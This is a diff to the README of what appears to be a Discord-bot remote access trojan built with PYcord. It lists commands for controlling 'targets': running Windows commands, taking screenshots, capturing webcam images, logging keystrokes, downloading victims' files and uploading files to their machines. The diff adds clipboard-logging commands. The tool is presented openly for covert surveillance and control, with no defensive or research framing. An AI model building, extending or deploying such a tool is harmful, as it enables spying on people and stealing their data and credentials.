@@ -8,13 +8,21 @@ PYcord featuring multiple cool commands you can use to control your targets, inc
 .cd    to change directory
 .ls    to list directory
 .exe <command> to run windows command
+
 .hello to make sure if bot is running
 .marco to show latency
+
 .screenshot to screen shot
 .snapcam  to snap camera
+
 .keylog_start to start keylogger
 .keylog_read to read keylogger
 .keylog_stop to stop keylogger
+
+.cliplog_start to start cliplogger
+.cliplog_read to read cliplogger
+.cliplog_stop to stop cliplogger
+
 .download <file> to make file from target into downloadable link
 .upload <url\file> to make file from a url uploaded into target
 ```
